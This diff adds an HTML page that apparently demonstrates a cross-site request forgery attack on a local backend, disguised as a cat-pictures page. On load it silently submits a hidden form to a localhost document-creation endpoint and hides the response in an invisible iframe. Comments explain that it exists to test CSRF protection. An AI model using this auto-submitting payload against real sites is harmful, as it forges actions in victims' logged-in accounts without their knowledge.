@@ -1,0 +1,57 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Totally Normal Cat Pictures</title>
+    <style>
+        body { font-family: system-ui, sans-serif; max-width: 720px; margin: 2rem auto; padding: 0 1rem; color: #222; }
+        .box { border: 1px solid #ccc; border-radius: 6px; padding: 1rem; margin: 1rem 0; }
+        .note { font-size: 0.85rem; color: #666; }
+        code { background: #f4f4f4; padding: 0 0.25rem; border-radius: 3px; }
+        #log { white-space: pre-wrap; font-family: monospace; font-size: 0.85rem; }
+    </style>
+</head>
+<body>
+<h1>Totally Normal Cat Pictures</h1>
+<p>Nothing to see here. 🐈</p>
+
+<div class="box">
+    <strong>Attacker's view (for the demo)</strong>
+    <p class="note">
+        This page is served from <code id="origin"></code>. On load it silently submits a form
+        to the bff, creating a document in whoever is logged in there. The victim never clicks anything.
+    </p>
+    <div id="log"></div>
+</div>
+
+<!--
+  The attack: a plain HTML form. A form can POST cross-origin with no preflight, and the browser
+  attaches the bff's session cookie if SameSite allows it. It can only send form-urlencoded,
+  multipart, or text/plain bodies, which is why the bff needs a form-accepting endpoint for
+  this demo to test CSRF protection rather than content-type checking.
+-->
+<form id="attack" method="POST" action="http://localhost:8081/api/documents/quick" target="sink">
+    <input type="hidden" name="title" value="Created via CSRF">
+    <input type="hidden" name="content" value="Created by a page the victim merely visited.">
+</form>
+
+<!--
+  Hidden iframe: the form's response loads here instead of navigating the page away, so the
+  victim sees nothing. The attacker also can't READ this response: it's cross-origin, so the
+  same-origin policy blocks access. The attack is write-only, and it doesn't need to read anything.
+-->
+<iframe name="sink" style="display:none"></iframe>
+
+<script>
+    const log = (msg) => document.getElementById("log").textContent += msg + "\n";
+    document.getElementById("origin").textContent = location.origin;
+
+    window.addEventListener("load", () => {
+        log("Submitting forged POST to http://localhost:8081/api/documents/quick ...");
+        document.getElementById("attack").submit();
+        log("Submitted. The attacker can't see the result; check alice's documents in the bff to find out.");
+    });
+</script>
+</body>
+</html>
